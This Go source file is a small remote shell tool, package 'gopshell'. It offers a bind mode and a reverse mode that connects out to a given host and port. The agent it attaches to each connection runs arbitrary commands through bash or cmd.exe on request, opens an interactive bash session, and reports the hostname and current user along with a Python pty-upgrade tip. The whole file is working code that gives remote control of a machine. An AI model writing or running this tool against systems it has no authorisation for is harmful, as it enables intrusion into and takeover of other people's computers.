package gopshell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

// Run a reverse of bind shell
func RunShellCmd(mode string, host string, port string) {
	fmt.Println("[+] Start the shell as mode :", mode)

	switch mode {
	case "bind":
		bindShell(host, port)
	case "reverse":
		reverseShell(host, port)
	default:
		log.Fatal("Unknown mode")
	}
}

func bindShell(host string, port string) {
	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Binding to ", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}
		fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
		go runAgent(conn)
	}

}

func reverseShell(host string, port string) {

	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Address ", address)

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to dial the address")
	}
	defer conn.Close()

	runAgent(conn)
}

func runAgent(conn net.Conn) {
	for {
		conn.Write([]byte("$> "))

		input := make([]byte, 4096)
		n, _ := conn.Read(input)
		if n == 0 {
			break
		}
		command := string(input[:n])
		command = strings.TrimSpace(command)

		switch command {
		case "help":
			displayHelp(conn)
		case "shell":
			conn.Write([]byte("[+] Run shell command\n"))
			runShell(conn)
			break
		case "exit":
			conn.Write([]byte("Exiting this agent\n"))
			conn.Close()
			break
		default:
			if strings.HasPrefix(command, "exec") {
				runCommand(conn, command[len("exec "):])
				break
			}
			conn.Write([]byte("Unknow commad\n"))
		}
	}
}

func displayHelp(conn net.Conn) {
	conn.Write([]byte("[+] Help\n"))
	conn.Write([]byte("\t- help\tDisplay this help\n"))
	conn.Write([]byte("\t- shell\tRun a shell\n"))
	conn.Write([]byte("\t- exec\texecute command given in parameters\n"))
	conn.Write([]byte("\t- exit\texit\n"))
}

func runCommand(conn net.Conn, input string) {
	var out []byte
	var err error

	if runtime.GOOS == "windows" {
		out, err = exec.Command("cmd.exe", "/c", input).Output()
	} else {
		out, err = exec.Command("/bin/bash", "-c", input).Output()
	}
	if err != nil {
		conn.Write([]byte("[!] Erreur running command\n"))
		return
	}
	conn.Write([]byte(out))
}

func runShell(conn net.Conn) {
	r, w := io.Pipe()

	cmd := exec.Command("/bin/bash", "-i")

	go io.Copy(conn, r)

	// Get System information
	hostname, _ := exec.Command("hostname").Output()
	whoami, _ := exec.Command("whoami").Output()

	fmt.Fprintf(w, "\n[+] Hostname : %s", hostname)
	fmt.Fprintf(w, "[+] Whoami : %s", whoami)

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
		path, err := exec.LookPath("powershell")
		if err == nil {
			fmt.Fprintf(w, "\n[+] Powershell is installed\n[+] Run : %s\n\n", path)
		}
	} else {
		path, err := exec.LookPath("python")
		if err == nil {
			fmt.Fprintf(w, "\n[+] Python is installed\n[+] Run : %s %s\n\n", path, "-c \"import pty; pty.spawn('/bin/bash')\"")
		}
	}

	cmd.Stdin = conn
	cmd.Stdout = w
	cmd.Stderr = w

	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}
}
